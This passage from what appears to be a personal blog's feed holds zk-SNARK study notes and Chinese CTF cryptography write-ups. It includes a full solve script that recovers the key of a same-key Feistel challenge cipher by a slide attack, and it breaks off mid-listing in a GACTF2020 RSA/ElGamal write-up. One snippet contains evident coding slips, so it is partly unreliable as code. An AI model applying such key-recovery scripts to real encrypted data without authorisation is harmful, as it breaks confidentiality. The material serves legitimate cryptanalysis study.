inline">\(E(\alpha_{a}A_{i}(t))=\alpha_{a}E(A_{i}(t))\)</span></p><p>Alice通过计算<span class="math inline">\(\sum s_{i}E(A_{i}(t))\)</span>得到<span class="math inline">\(E(A(t))\)</span>，并类似得到<span class="math inline">\(E(\alpha_{a}A(t))\)</span></p><p>类似的要求Alice计算出对应B和C的二元对后，仍存在问题，即<strong>无法确定Alice用于约束<span class="math inline">\(A_{i}(t),B_{i}(t),C_{i}(t)\)</span>所用的s向量相同</strong></p><p>因此引入多项式序列L(x)，其中<span class="math inline">\(L_{i}(x)=A_{i}(x)+B_{i}(x)+C_{i}(x)\)</span></p><p>选取随机数<span class="math inline">\(\beta\)</span>，Bob发送M个二元对，</p><p><span class="math inline">\((E(L_{1}(t)),E(\beta L_{1}(t))),(E(L_{2}(t)),E(\beta L_{2}(t))),...,(E(L_{M}(t)),E(\beta L_{M}(t)))\)</span></p><p>Alice计算<span class="math inline">\(E(L(t))=\sum s_{i}E(L_{i}(t)),E(\beta L(t))=\sum s_{i}E(\beta L_{i}(t))\)</span></p><p>校验<span class="math inline">\(E(\beta L(t))?=\beta(E(A(t))+E(B(t))+E(C(t)))\)</span>，（因为只有当约束A,B,C,L的所用向量相同时才成立）</p><p>最后发送<span class="math inline">\(E(t^{0}),E(t^{1}),E(t^{2}),...\)</span>，供Alice计算E(H(t))</p><p><img src= "/img/loading.gif" data-src="/2020/10/26/Learning-of-NIZK/rf5OBq87NWCjy3K.png" style="zoom: 50%;"></p><ol type="1"><li><p><span class="math inline">\(E(\alpha_{a}A(t))?=\alpha_{a}E(A(t))\)</span>校验Alice传回的E(A(t))是否为<span class="math inline">\(E(A_{i}(t))\)</span>的线性组合，B,C类似</p></li><li><p><span class="math inline">\(E(\beta L(t))?=\beta(E(A(t))+E(B(t))+E(C(t)))\)</span>校验A,B,C中使用的为同一个解向量s</p></li><li><p><span class="math inline">\(E(A(t)B(t)-C(t))?=E(H(t)Z(t))\)</span>校验使用的解向量s是否正确</p></li></ol><h4 id="实际方案">实际方案</h4><p>上述所使用的同态加法运算E在椭圆曲线上，因此无法实现高效的<span class="math inline">\(E^{-1}\)</span>，考虑引入双线性对</p><blockquote><p><span class="math inline">\(G_1,G_2,G_T\)</span>为n阶乘法循环群（椭圆曲线上加法），一个双线性对e就是一个从<span class="math inline">\(G_1\times G_2\)</span>到<span class="math inline">\(G_T\)</span>的双线性映射</p><p>其中满足的最重要一条性质即为双线性性：</p><p><span class="math inline">\(g_1\in G_1,g_2\in G_2,e(g_1^a,g_2^b)=e(g_1,g_2)^{ab}\)</span>.</p></blockquote><p>(椭圆曲线) 假设<span class="math inline">\(G_1\)</span>上的加法同态运算定义为<span class="math inline">\(E_1\)</span>(基点*x), <span class="math inline">\(G_2\)</span>上的加法同态定义作<span class="math inline">\(E_2\)</span>，则</p><p><span class="math inline">\(e(E_1(x),E_2(y))=e(E_1(u),E_2(v)),xy=uv\)</span>.</p><p>通过双线性对，当t = xy = uv时，</p><p><span class="math inline">\(E(t)=e(E_1(x),E_2(y))=e(E_1(u),E_2(v))\)</span></p><p>且<span class="math inline">\(E(ax+by)=e(E_1(ax+by),E_2(1))=e(aE_1(x)+bE_1(y),E_2(1))=aE(x)+bE(y)\)</span>，满足加法同态</p><p>因此可采用共同参考数据集（CRS）实现以下zk-SHARKS流程：</p><p><img src= "/img/loading.gif" data-src="/2020/10/26/Learning-of-NIZK/EvIdr9wHxL6UQAP.png"></p><ol type="1"><li><p><span class="math inline">\(e(E_1(A(t)),E_2(\alpha_{a}))?=e(E_1(\alpha_{a}A(t)),E_2(1))\)</span>，校验Alice传回的<span class="math inline">\(E_1(A(t))\)</span>是否为<span class="math inline">\(E_1(A_{i}(t))\)</span>的线性组合</p></li><li><p><span class="math inline">\(e(E_1(\alpha_{b}),E_2(B(t)))?=e(E_1(1),E_2(\alpha_{b}B(t)))\)</span>，校验Alice传回的<span class="math inline">\(E_2(B(t))\)</span>是否为<span class="math inline">\(E_2(B_{i}(t))\)</span>的线性组合</p></li><li><p><span class="math inline">\(e(E_1(C(t)),E_2(\alpha_{c}))?=e(E_1(\alpha_{c}C(t)),E_2(1))\)</span>，校验Alice传回的<span class="math inline">\(E_1(C(t))\)</span>是否为<span class="math inline">\(E_1(C_{i}(t))\)</span>的线性组合</p></li><li><p><span class="math inline">\(e(E_1(βL(t)),E_2(1))?=E(\beta(A(t)+B(t)+C(t)))=e(E_1(A(t))+E_1(C(t)),E_2(\beta))+e(E_1(\beta),E_2(B(t)))\)</span>，校验A,B,C中使用的为同一个解向量s</p></li><li><p><span class="math inline">\(e(E_1(A(t)),E_2(B(t)))?=e(E_1(H(t)),E_2(Z(t)))+e(E_1(C(t)),E_2(1))\)</span>，校验向量s正确性</p></li></ol><h3 id="zcash构建zk-snarks">zcash构建zk-SNARKS</h3><p><a href="https://m.mytokencap.com/news/116994" target="_blank" rel="noopener">https://m.mytokencap.com/news/116994</a></p><p>利用 libsnark 库开发 zk-SNARKs</p><p><a href="https://zhuanlan.zhihu.com/p/100809637" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/100809637</a></p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>金融密码杯2020-挑战赛</title>
      <link href="/2020/09/22/%E9%87%91%E8%9E%8D%E5%AF%86%E7%A0%81%E6%9D%AF2020-%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/2020/09/22/%E9%87%91%E8%9E%8D%E5%AF%86%E7%A0%81%E6%9D%AF2020-%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h3 id="preface">Preface</h3><p>sl和coin带我躺了ojzzzz，这里仅作dec-01的记录，其他题目全是SM国密系列</p><h3 id="dec---01">dec - 01</h3><h4 id="题目文件">[题目文件]</h4><p><a href="release.zip">Click Here to Download</a></p><h4 id="题解分析">[题解分析]</h4><p>111111 round的feistel，但每轮使用的轮密钥均相同（思维固化一直以为是差分一直卡着，111111轮想🍑</p><p>且给出的明密文对中，给出的前65536组pt前四个字节fixed('aaaa')，后65526组pt后四个字节fixed('aaaa')</p><p>寻找碰撞，找到满足以下条件的明密文对：</p><p>当suffix-fixed的pt在第一轮加密后的输出，恰好等于prefix-fixed的pt的第一轮输入时，</p><p>suffix-fixed的ct的左部等于prefix-fixed的ct的右部</p><p><img src= "/img/loading.gif" data-src="/2020/09/22/%E9%87%91%E8%9E%8D%E5%AF%86%E7%A0%81%E6%9D%AF2020-%E6%8C%91%E6%88%98%E8%B5%9B/CRYPTO_DRAW.png"></p><p>找到碰撞后，分别获得完整第一轮及最后一轮的输入输出，校验二者求出的key是否相同即可</p><p>当相同时即获得正确flag，对cipher解密得到flag{beginning_of_cryptanalysis_series_excited}</p><p>碰撞概率估计</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>((<span class="number">2</span>**<span class="number">32</span><span class="number">-2</span>**<span class="number">16</span>)/(<span class="number">2</span>**<span class="number">32</span>))**<span class="number">65536</span></span><br><span class="line"><span class="number">0.36787663445620106</span></span><br></pre></td></tr></table></figure><p>成功找到一对碰撞的概率约为0.64，本题中恰能找到一对</p><h4 id="exp">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"></span><br><span class="line">Sbox = [<span class="number">0x63</span>, <span class="number">0x7c</span>, <span class="number">0x77</span>, <span class="number">0x7b</span>, <span class="number">0xf2</span>, <span class="number">0x6b</span>, <span class="number">0x6f</span>, <span class="number">0xc5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2b</span>, <span class="number">0xfe</span>, <span class="number">0xd7</span>, <span class="number">0xab</span>, <span class="number">0x76</span>, <span class="number">0xca</span>, <span class="number">0x82</span>, <span class="number">0xc9</span>, <span class="number">0x7d</span>, <span class="number">0xfa</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xf0</span>, <span class="number">0xad</span>, <span class="number">0xd4</span>, <span class="number">0xa2</span>, <span class="number">0xaf</span>, <span class="number">0x9c</span>, <span class="number">0xa4</span>, <span class="number">0x72</span>, <span class="number">0xc0</span>, <span class="number">0xb7</span>, <span class="number">0xfd</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3f</span>, <span class="number">0xf7</span>, <span class="number">0xcc</span>, <span class="number">0x34</span>, <span class="number">0xa5</span>, <span class="number">0xe5</span>, <span class="number">0xf1</span>, <span class="number">0x71</span>, <span class="number">0xd8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0xc7</span>, <span class="number">0x23</span>, <span class="number">0xc3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9a</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xe2</span>, <span class="number">0xeb</span>, <span class="number">0x27</span>, <span class="number">0xb2</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2c</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x6e</span>, <span class="number">0x5a</span>, <span class="number">0xa0</span>, <span class="number">0x52</span>, <span class="number">0x3b</span>, <span class="number">0xd6</span>, <span class="number">0xb3</span>, <span class="number">0x29</span>, <span class="number">0xe3</span>, <span class="number">0x2f</span>, <span class="number">0x84</span>, <span class="number">0x53</span>, <span class="number">0xd1</span>, <span class="number">0x00</span>, <span class="number">0xed</span>, <span class="number">0x20</span>, <span class="number">0xfc</span>, <span class="number">0xb1</span>, <span class="number">0x5b</span>, <span class="number">0x6a</span>, <span class="number">0xcb</span>, <span class="number">0xbe</span>, <span class="number">0x39</span>, <span class="number">0x4a</span>, <span class="number">0x4c</span>, <span class="number">0x58</span>, <span class="number">0xcf</span>, <span class="number">0xd0</span>, <span class="number">0xef</span>, <span class="number">0xaa</span>, <span class="number">0xfb</span>, <span class="number">0x43</span>, <span class="number">0x4d</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xf9</span>, <span class="number">0x02</span>, <span class="number">0x7f</span>, <span class="number">0x50</span>, <span class="number">0x3c</span>, <span class="number">0x9f</span>, <span class="number">0xa8</span>, <span class="number">0x51</span>, <span class="number">0xa3</span>, <span class="number">0x40</span>, <span class="number">0x8f</span>, <span class="number">0x92</span>, <span class="number">0x9d</span>, <span class="number">0x38</span>, <span class="number">0xf5</span>, <span class="number">0xbc</span>, <span class="number">0xb6</span>, <span class="number">0xda</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xff</span>, <span class="number">0xf3</span>, <span class="number">0xd2</span>, <span class="number">0xcd</span>, <span class="number">0x0c</span>, <span class="number">0x13</span>, <span class="number">0xec</span>, <span class="number">0x5f</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xc4</span>, <span class="number">0xa7</span>, <span class="number">0x7e</span>, <span class="number">0x3d</span>, <span class="number">0x64</span>, <span class="number">0x5d</span>, <span class="number">0x19</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4f</span>, <span class="number">0xdc</span>, <span class="number">0x22</span>, <span class="number">0x2a</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xee</span>, <span class="number">0xb8</span>, <span class="number">0x14</span>, <span class="number">0xde</span>, <span class="number">0x5e</span>, <span class="number">0x0b</span>, <span class="number">0xdb</span>, <span class="number">0xe0</span>, <span class="number">0x32</span>, <span class="number">0x3a</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5c</span>, <span class="number">0xc2</span>, <span class="number">0xd3</span>, <span class="number">0xac</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xe4</span>, <span class="number">0x79</span>, <span class="number">0xe7</span>, <span class="number">0xc8</span>, <span class="number">0x37</span>, <span class="number">0x6d</span>, <span class="number">0x8d</span>, <span class="number">0xd5</span>, <span class="number">0x4e</span>, <span class="number">0xa9</span>, <span class="number">0x6c</span>, <span class="number">0x56</span>, <span class="number">0xf4</span>, <span class="number">0xea</span>, <span class="number">0x65</span>, <span class="number">0x7a</span>, <span class="number">0xae</span>, <span class="number">0x08</span>, <span class="number">0xba</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2e</span>, <span class="number">0x1c</span>, <span class="number">0xa6</span>, <span class="number">0xb4</span>, <span class="number">0xc6</span>, <span class="number">0xe8</span>, <span class="number">0xdd</span>, <span class="number">0x74</span>, <span class="number">0x1f</span>, <span class="number">0x4b</span>, <span class="number">0xbd</span>, <span class="number">0x8b</span>, <span class="number">0x8a</span>, <span class="number">0x70</span>, <span class="number">0x3e</span>, <span class="number">0xb5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xf6</span>, <span class="number">0x0e</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xb9</span>, <span class="number">0x86</span>, <span class="number">0xc1</span>, <span class="number">0x1d</span>, <span class="number">0x9e</span>, <span class="number">0xe1</span>, <span class="number">0xf8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xd9</span>, <span class="number">0x8e</span>, <span class="number">0x94</span>, <span class="number">0x9b</span>, <span class="number">0x1e</span>, <span class="number">0x87</span>, <span class="number">0xe9</span>, <span class="number">0xce</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xdf</span>, <span class="number">0x8c</span>, <span class="number">0xa1</span>, <span class="number">0x89</span>, <span class="number">0x0d</span>, <span class="number">0xbf</span>, <span class="number">0xe6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2d</span>, <span class="number">0x0f</span>, <span class="number">0xb0</span>, <span class="number">0x54</span>, <span class="number">0xbb</span>, <span class="number">0x16</span>]</span><br><span class="line">inv_Sbox = [Sbox.index(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bytes(x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b))</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'ciphertext'</span>, <span class="string">'r'</span>)</span><br><span class="line">cipher = unhexlify(f.readline().strip())</span><br><span class="line">prefix_a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">    _ = f.readline().strip().split(<span class="string">' '</span>)</span><br><span class="line">    prefix_a.append((_[<span class="number">0</span>], _[<span class="number">1</span>]))</span><br><span class="line">suffix_a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">    _ = f.readline().strip().split(<span class="string">' '</span>)</span><br><span class="line">    suffix_a.append((_[<span class="number">0</span>], _[<span class="number">1</span>]))</span><br><span class="line">prefix_a_ct_right, suffix_a_ct_left = set(), set()</span><br><span class="line">prefix_a_ct_back, suffix_a_ct_back = dict(), dict()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">    prefix_a_ct_right.add(prefix_a[i][<span class="number">1</span>][<span class="number">8</span>:])</span><br><span class="line">    prefix_a_ct_back[prefix_a[i][<span class="number">1</span>][<span class="number">8</span>:]] = i</span><br><span class="line">    suffix_a_ct_left.add(suffix_a[i][<span class="number">1</span>][:<span class="number">8</span>])</span><br><span class="line">    suffix_a_ct_back[suffix_a[i][<span class="number">1</span>][:<span class="number">8</span>]] = i</span><br><span class="line">crash = prefix_a_ct_right &amp; suffix_a_ct_left</span><br><span class="line">pairs = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> crash:</span><br><span class="line">    i, j = prefix_a_ct_back[_], suffix_a_ct_back[_]</span><br><span class="line">    pairs.append((prefix_a[i], suffix_a[j]))</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> pairs:</span><br><span class="line">    print(_)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(x, k)</span>:</span></span><br><span class="line">    tmp = list(xor(x, k))</span><br><span class="line">    tmp = [Sbox[_] <span class="keyword">for</span> _ <span class="keyword">in</span> tmp]</span><br><span class="line">    _ = tmp[<span class="number">1</span>:] + [<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        tmp[i] = (tmp[i] + _[i]) % <span class="number">0x100</span></span><br><span class="line">    <span class="keyword">return</span> bytes(tmp)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_func</span><span class="params">(x, k)</span>:</span></span><br><span class="line">    tmp = list(x)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        tmp[i] = (tmp[i] - tmp[i+<span class="number">1</span>]) % <span class="number">0x100</span></span><br><span class="line">    tmp = [inv_Sbox[_] <span class="keyword">for</span> _ <span class="keyword">in</span> tmp]</span><br><span class="line">    <span class="keyword">return</span> xor(bytes(tmp), k)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_key</span><span class="params">(pair)</span>:</span></span><br><span class="line">    x = xor(unhexlify(pair[<span class="number">0</span>][<span class="number">0</span>][<span class="number">8</span>:]), unhexlify(pair[<span class="number">1</span>][<span class="number">0</span>][:<span class="number">8</span>]))</span><br><span class="line">    tmp = list(x)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        tmp[i] = (tmp[i] - tmp[i + <span class="number">1</span>]) % <span class="number">0x100</span></span><br><span class="line">    tmp = [inv_Sbox[_] <span class="keyword">for</span> _ <span class="keyword">in</span> tmp]</span><br><span class="line">    key1 = xor(bytes(tmp), unhexlify(pair[<span class="number">1</span>][<span class="number">0</span>][<span class="number">8</span>:]))</span><br><span class="line">    x = xor(unhexlify(pair[<span class="number">1</span>][<span class="number">1</span>][<span class="number">8</span>:]), unhexlify(pair[<span class="number">0</span>][<span class="number">1</span>][:<span class="number">8</span>]))</span><br><span class="line">    tmp = list(x)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        tmp[i] = (tmp[i] - tmp[i + <span class="number">1</span>]) % <span class="number">0x100</span></span><br><span class="line">    tmp = [inv_Sbox[_] <span class="keyword">for</span> _ <span class="keyword">in</span> tmp]</span><br><span class="line">    key2 = xor(bytes(tmp), unhexlify(pair[<span class="number">0</span>][<span class="number">1</span>][<span class="number">8</span>:]))</span><br><span class="line">    <span class="keyword">if</span> key1 == key2:</span><br><span class="line">        <span class="keyword">return</span> key1</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pair <span class="keyword">in</span> pairs:</span><br><span class="line">    k = crack_key(pair)</span><br><span class="line">    <span class="keyword">if</span> k:</span><br><span class="line">        key = k</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec_block</span><span class="params">(x, k)</span>:</span></span><br><span class="line">    l, r = x[:<span class="number">4</span>], x[<span class="number">4</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">111111</span>):</span><br><span class="line">        l, r = r, xor(l, func(r, k))</span><br><span class="line">    l, r = r, l</span><br><span class="line">    <span class="keyword">return</span> (l + r)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(x, k)</span>:</span></span><br><span class="line">    pt = <span class="string">b''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(x), <span class="number">8</span>):</span><br><span class="line">        pt += dec_block(x[i:i+<span class="number">8</span>], k)</span><br><span class="line">    <span class="keyword">return</span> pt</span><br><span class="line"></span><br><span class="line">print(dec(cipher, key))</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">(('61616161c5039c68', 'ac74c268a9084661'), ('29d6d89e61616161', 'a9084661a403759e'))</span></span><br><span class="line"><span class="string">(('61616161cb9d3d82', 'e2c22abd8cf47ca5'), ('9397d96461616161', '8cf47ca5cb8de97a'))</span></span><br><span class="line"><span class="string">(('616161614e9c397d', 'a9a59268a5a34a22'), ('de59099b61616161', 'a5a34a22c8c8d126'))</span></span><br><span class="line"><span class="string">(('616161612ca7387d', '69b59568e8cf6822'), ('7f62089b61616161', 'e8cf6822ed24df26'))</span></span><br><span class="line"><span class="string">(('616161613f847d04', 'a9eae19288dcb189'), ('4e6a4de261616161', '88dcb1891503e936'))</span></span><br><span class="line"><span class="string">b'Nb=\x94'</span></span><br><span class="line"><span class="string">b'flag&#123;beginning_of_cryptanalysis_series_excited&#125;\x01'</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h4 id="link">[Link]</h4><p><a href="http://theamazingking.com/crypto-slide.php" target="_blank" rel="noopener">http://theamazingking.com/crypto-slide.php</a></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp(GACTF2020) - Crypto</title>
      <link href="/2020/08/30/WriteUp-GACTF2020-Crypto/"/>
      <url>/2020/08/30/WriteUp-GACTF2020-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="da-vinci-after-rsa">da Vinci after rsa</h3><h4 id="题解分析">[题解分析]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">factor(<span class="number">0x1d42aea2879f2e44dea5a13ae3465277b06749ce9059fd8b7b4b560cd861f99144d0775ffffffffffff</span>)</span><br><span class="line"><span class="comment"># 9749 * 11237753507624591 * 9127680453986244150392840833873266696712898279308227257525736684312919750469261</span></span><br></pre></td></tr></table></figure><p>e=5，取最大的素因子p，发现e|(p-1)，AMM整出<code>b'flag{weadfa9987_adwd23123_454f}'</code></p><p>然后出了个古典的达芬奇密码可还行...</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fb = [<span class="string">'1'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'5'</span>, <span class="string">'8'</span>, <span class="string">'13'</span>, <span class="string">'21'</span>, <span class="string">'34'</span>, <span class="string">'55'</span>, <span class="string">'89'</span>, <span class="string">'144'</span>, <span class="string">'233'</span>, <span class="string">'377'</span>, <span class="string">'610'</span>, <span class="string">'987'</span>, <span class="string">'1597'</span>, <span class="string">'2584'</span>, <span class="string">'4181'</span>, <span class="string">'6765'</span>, <span class="string">'10946'</span>, <span class="string">'17711'</span>, <span class="string">'28657'</span>, <span class="string">'46368'</span>, <span class="string">'75025'</span>, <span class="string">'121393'</span>, <span class="string">'196418'</span>, <span class="string">'317811'</span>, <span class="string">'514229'</span>, <span class="string">'832040'</span>, <span class="string">'1346269'</span>, <span class="string">'2178309'</span>]</span><br><span class="line">fb = [int(i) <span class="keyword">for</span> i <span class="keyword">in</span> _]</span><br><span class="line">t = [<span class="number">1</span>,<span class="number">28657</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">17711</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">46368</span>,<span class="number">75025</span>,<span class="number">34</span>,<span class="number">55</span>,<span class="number">89</span>,<span class="number">610</span>,<span class="number">377</span>,<span class="number">144</span>,<span class="number">233</span>,<span class="number">1597</span>,<span class="number">2584</span>,<span class="number">4181</span>,<span class="number">6765</span>,<span class="number">10946</span>,<span class="number">987</span>]</span><br><span class="line">m = <span class="string">'weadfa9987_adwd23123_454f'</span></span><br><span class="line">s = <span class="string">'?'</span> * <span class="number">25</span></span><br><span class="line">s = <span class="string">'list(s)'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">25</span>):</span><br><span class="line">    <span class="comment"># s[fb.index(t[i])] = m[i]</span></span><br><span class="line">    s[i] = m[fb.index(t[i])]</span><br><span class="line">print(<span class="string">''</span>.join(s))</span><br><span class="line"><span class="comment"># w5awd4fa994f87_dwad3123_2</span></span><br></pre></td></tr></table></figure><p>由于斐波那契前两个均为1，且t[0]=t[3]=1，因此将s[3]替换为m[1]，得到flag{w5aed4fa994f87_dwad3123_2}</p><h3 id="elgaml_rsa">elgaml_rsa</h3><h4 id="题解分析-1">[题解分析]</h4><p>r以LCG生成 <span class="math display">\[c1=g^{r}(mod\ p)\\c2=m\cdot h^{r}(mod\ p)\\c11=g^{(Br+A)\%q}(mod\ p)\\c22=m\cdot h^{(Br+A)\%q}(mod\ p)\\g^{q}\equiv 1(mod\ p)\]</span> 因此<span class="math inline">\(c2^{B}\cdot h^{A}\cdot(c22)^{-1}=m^{B-1}(mod\ p)\)</span>，且在这题里检验发现gcd(B-1,p-1)=1，所以直接还原得到m</p><p>得到m，即secret后，知<code>pow(flag,e,secret)=c</code>，yafu跑次secret，得到分解结果</p><p>(ps：yafu挺离谱的...分解出的因子幂次都不告诉的...只显示出来一部分...歪日)</p><p>发现secret的一个因子<code>m0=653551912583</code>，且幂次为15</p><p>由于<code>gcd(e,(m*(m0-1))//m0)=2</code>，化简得到c'后，c'即为<span class="math inline">\(pow(flag,2,m0^{15})\)</span>，AMM求二次根得到结果</p><p>对<span class="math inline">\(p^{k}\)</span>的AMM，按照如下paper给出的算法，将q替换成<span class="math inline">\(q^{k}\)</span>，phi等替换下即可</p><p><img src= "/img/loading.gif" data-src="/2020/08/30/WriteUp-GACTF2020-Crypto/QNy9EWc7K4enJGu.png"></p><h4 id="exp">[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 